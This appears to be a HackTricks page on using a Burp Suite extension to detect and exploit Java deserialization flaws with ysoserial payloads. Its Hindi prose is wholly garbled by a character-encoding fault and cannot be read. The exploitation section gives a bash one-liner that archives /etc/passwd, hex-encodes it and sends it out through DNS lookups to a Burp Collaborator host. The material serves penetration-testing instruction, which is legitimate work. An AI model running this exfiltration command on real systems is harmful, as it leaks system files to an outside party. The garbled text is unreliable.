рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ **рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХреЗ рдЬрд╛рджреВ рдмрд╛рдЗрдЯреНрд╕** рдХреЛ рдвреВрдВрдврд╝ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рднреА рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛:

![](<../../.gitbook/assets/image (290).png>)

### рд╕рдХреНрд░рд┐рдп

**рдореИрдиреНрдпреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг**

рдЖрдк рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕ рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ `Send request to DS - Manual Testing` рдХрд░реЗрдВред\
рдлрд┐рд░, _рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕реНрдХреИрдирд░ рдЯреИрдм_ --> _рдореИрдиреНрдпреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг рдЯреИрдм_ рдХреЗ рдЕрдВрджрд░ рдЖрдк **рдЗрдВрдЬреЗрдХреНрд╢рди рдкреНрд╡рд╛рдЗрдВрдЯ** рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ **рдкрд░реАрдХреНрд╖рдг рд╢реБрд░реВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрдкрдпреБрдХреНрдд рдПрдЯреИрдХ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬреЛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЧрдИ рдХреЛрдбрд┐рдВрдЧ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ)ред

![](../../.gitbook/assets/3-1.png)

рдпрд╣ "рдореИрдиреНрдпреБрдЕрд▓ рдкрд░реАрдХреНрд╖рдг" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХрд╛рдлреА **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рд╣реИред рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди** рдХрд┐рд╕реА рднреА **ysoserial рдкреЗрд▓реЛрдб** рдХреЗ рд▓рд┐рдП **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓** рд╣реИ, рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдореМрдЬреВрдж рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ рдФрд░ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╡рд╛рд▓реЛрдВ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдЧрд╛ред **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ** рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЬрд╛рд╡рд╛ рдХреА **рдиреАрдВрджреЗрдВ**, **рд╕реАрдк** рджреНрд╡рд╛рд░рд╛ **рд╕реАрдк** рдФрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдбреАрдПрдирдПрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рд╢реЛрд╖рдг**

рдПрдХ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ _рд╢реЛрд╖рдг рдЯреИрдм_ рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рдЯреИрдм рдореЗрдВ рдЖрдкрдХреЛ рдлрд┐рд░ рд╕реЗ **рдЗрдВрдЬреЗрдХреНрд╢рди рдкреНрд╡рд╛рдЗрдВрдЯ** рдХрд╛ рдЪрдпрди рдХрд░рдирд╛ рд╣реЛрдЧрд╛, рдПрдХ **рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдп** рдФрд░ **рдХрдорд╛рдВрдб** рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдЙрдЪрд┐рдд **рдЕрдЯреИрдХ** рдмрдЯрди рджрдмрд╛рдПрдВред

![](<../../.gitbook/assets/4 (1).png>)

### рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди DNS Exfil рдЬрд╛рдирдХрд╛рд░реА

рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рддрд░рд╣ рдХреБрдЫ рдРрд╕рд╛ рдХрд░рд╛рдПрдВ:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
